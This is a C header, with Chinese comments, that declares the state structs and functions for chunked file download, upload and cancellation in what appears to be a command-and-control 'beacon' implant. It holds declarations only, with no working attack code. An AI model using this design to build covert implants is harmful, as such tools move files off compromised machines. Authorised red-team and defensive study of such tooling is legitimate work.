#pragma once

#include "beacon_common.h"
#include "beacon_packet.h"

struct BeaconContext;

/* 活动文件下载的状态 */
typedef struct DownloadState {
    UINT32 original_task_id;
    CHAR task_id[128];
    CHAR remote[512];
    WCHAR remote_path[MAX_PATH * 2];
    CHAR file_id[65];
    INT chunk_size;
    INT next_chunk_index;
    INT total_chunks;
    INT chunks_per_heartbeat;
    ULONGLONG started_at;
    struct DownloadState* next;
} DownloadState;

/* 活动文件上传的状态 */
typedef struct UploadState {
    UINT32 original_task_id;
    CHAR task_id[128];
    CHAR remote[512];
    WCHAR remote_path[MAX_PATH * 2];
    CHAR file_id[128];
    INT chunk_size;
    INT total_chunks;
    INT received_chunks;
    BYTE8* received_map;
    ULONGLONG started_at;
    struct UploadState* next;
} UploadState;

typedef struct UploadCancelEntry {
    CHAR task_id[128];
    ULONGLONG expire_at;
    struct UploadCancelEntry* next;
} UploadCancelEntry;

/* 管理所有活动文件传输 */
typedef struct TransferManager {
    struct BeaconContext* ctx;
    CRITICAL_SECTION lock;
    DownloadState* downloads;
    UploadState* uploads;
    UploadCancelEntry* canceled_uploads;
} TransferManager;

VOID TransferInit(TransferManager* tm, struct BeaconContext* ctx);
VOID TransferFree(TransferManager* tm);
PacketList TransferHandleDownload(struct BeaconContext* ctx, UINT32 original_task_id, Parser* parser);
ByteBuf TransferHandleUpload(struct BeaconContext* ctx, UINT32 original_task_id, Parser* parser);
PacketList TransferPoll(struct BeaconContext* ctx);
VOID TransferAppendJobs(TransferManager* tm, ByteBuf* out, SIZE_T* count, ULONGLONG now);
BOOL TransferCancelJob(struct BeaconContext* ctx, UINT32 job_id, ByteBuf* out);
